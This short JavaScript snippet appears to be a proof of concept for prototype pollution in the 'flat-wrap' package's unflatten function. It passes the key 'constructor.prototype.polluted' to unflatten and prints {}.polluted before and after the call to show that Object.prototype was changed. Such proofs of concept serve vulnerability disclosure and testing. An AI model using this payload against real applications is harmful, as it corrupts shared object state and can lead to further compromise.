var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {unflatten} = require('flat-wrap');
console.log({}.polluted);
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);